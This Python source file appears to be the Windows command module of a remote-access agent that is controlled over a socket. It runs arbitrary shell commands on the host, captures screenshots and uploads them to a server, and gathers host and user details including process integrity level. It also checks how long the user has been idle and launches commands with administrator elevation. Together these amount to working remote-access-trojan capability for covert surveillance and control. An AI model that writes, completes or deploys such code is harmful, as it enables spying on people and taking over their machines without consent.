import os
import platform
import subprocess
import sys
import tempfile

from client.commands.command_context import CommandCancelledError, CommandTimeoutError
from client.commands.common import CommonCommands
from client.commands.interrupts import timeout, cancel_policy, interruptible

from client.commands.platform.utils.win_util import get_integrity_level
from core.utils.client_util import get_executable_path
from core.utils.decorator import desc
from core.utils.formatting import get_time, format_dict
from core.utils.logger import logger


class WindowsCommands(CommonCommands):
    """Windows 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)

    @desc('Run a program without waiting (detached)', group='shell')
    @interruptible()
    def run(self, command):
        """
        启动程序但不等待返回（独立运行）
        """
        command_text = (command or '').strip()
        if not command_text:
            return 0, 'Usage: run <program ...>'

        try:
            # Windows: 创建新控制台窗口
            process = subprocess.Popen(
                command_text,
                shell=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )

            return 1, f'Process created: {process.pid}'

        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to start process: {e}'

    # ------------------ 截图 ------------------ #
    @desc('Capture screenshot', group='platform')
    @interruptible()
    @timeout(30)
    @cancel_policy(True)
    def screenshot(self):
        """
        截图并上传到服务器
        """
        try:
            import pyautogui

            self._send_interim_result(1, 'Capturing screenshot...', 0)

            # 创建临时文件
            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()

            # 截图
            screenshot = pyautogui.screenshot()
            screenshot.save(temp_file.name)

            file_size = os.path.getsize(temp_file.name)
            self._send_interim_result(1, f'Screenshot captured ({file_size} bytes)', 0)

            # 上传文件
            filename = f'screenshot_{get_time()}.png'
            self._upload_single_file_to_server_result(temp_file.name, category='screenshot')

            self._send_final_result(1, f'Screenshot uploaded: {filename}')

        except Exception as e:
            self._send_final_result(0, f'Screenshot failed: {e}')
        finally:
            if temp_file and os.path.exists(temp_file.name):
                try:
                    os.unlink(temp_file.name)
                except:
                    pass

    # ------------------ 系统信息 ------------------ #
    @desc('Get system information', group='platform')
    @interruptible()
    @timeout(30)
    @cancel_policy(True)
    def getinfo(self):
        """
        获取 Windows 系统信息
        """
        try:
            import psutil

            info = {}
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['os_version'] = platform.version()
            info['architecture'] = platform.machine()
            info['processor'] = platform.processor()
            info['cpu_count'] = os.cpu_count()

            # 内存信息
            mem = psutil.virtual_memory()
            info['mem_total'] = f'{mem.total / (1024 ** 3):.2f} GB'
            info['mem_avail'] = f'{mem.available / (1024 ** 3):.2f} GB'

            # 进程信息
            proc = psutil.Process()
            info['username'] = proc.username()
            info['integrity'] = get_integrity_level()
            info['exec_path'] = get_executable_path()
            info['cwd'] = os.getcwd()

            # Python 信息
            info['python_version'] = sys.version

            return 1, format_dict(info)

        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to get system info: {e}'

    # ------------------ 用户空闲时间 ------------------ #
    @desc('Get user idle time', group='platform')
    @interruptible()
    @timeout(10)
    @cancel_policy(True)
    def idletime(self):
        """
        获取用户空闲时间（秒）
        """
        try:
            import win32api

            idle_ms = win32api.GetTickCount() - win32api.GetLastInputInfo()
            idle_seconds = idle_ms / 1000.0

            return 1, f'User idle time: {idle_seconds:.2f} seconds'

        except Exception as e:
            return 0, f'Failed to get idle time: {e}'

    @desc('Run command as admin (Windows)', group='system')
    @interruptible()
    def runasadmin(self, command):
        """以管理员权限执行命令 (Windows)"""
        import ctypes
        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', 'cmd.exe', f'/c {command}', None, 1
            )
            if result > 32:
                return 1, f'Executed: {command}'
            return 0, f'Failed with code: {result}'
        except Exception as e:
            return 0, f'Failed: {e}'
